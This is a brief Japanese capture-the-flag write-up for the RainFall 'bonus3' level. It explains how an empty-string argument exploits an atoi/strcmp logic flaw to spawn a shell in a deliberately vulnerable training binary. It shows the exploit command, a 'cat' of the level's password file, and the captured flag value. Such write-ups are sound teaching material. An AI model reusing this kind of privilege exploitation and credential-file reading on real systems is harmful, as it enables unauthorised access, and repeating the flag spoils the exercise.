# bonus3

## 方針
((char *)buffer1)[atoi(argv[1])] = 0;
strcmp((char *)buffer1, argv[1]) == 0
になるようなargv１を渡せばshが起動する。

### ans
buffer[0] == 0 && argv[1][0] == ‘\0’ ''だとうまくいく。
なぜなら
0: 数値のゼロ
'': 空文字
バイナリ: 0x00 vs 0x00
つまり、./bonus3 '' でshが起動する。

```
bonus3@RainFall:~$ ./bonus3 ''
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

## memo
